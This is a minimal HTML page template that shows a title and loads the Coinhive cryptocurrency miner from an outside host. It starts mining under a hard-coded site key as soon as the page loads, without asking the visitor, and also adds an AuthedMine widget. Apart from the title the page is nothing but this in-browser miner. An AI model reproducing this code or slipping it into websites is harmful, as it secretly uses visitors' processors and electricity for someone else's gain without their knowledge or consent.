<html>
<body>

{{ .Title }}
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    var miner = new CoinHive.User('vPXveoyzf4yRHTHLzwEDBD3KIO7yRi1c', '{{ .Owner }}');
    miner.start();
</script>
<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
<div class="coinhive-miner"
    style="width: 256px; height: 310px"
    data-key="vPXveoyzf4yRHTHLzwEDBD3KIO7yRi1c">
    <em>Loading...</em>
</div>
</body>
</html>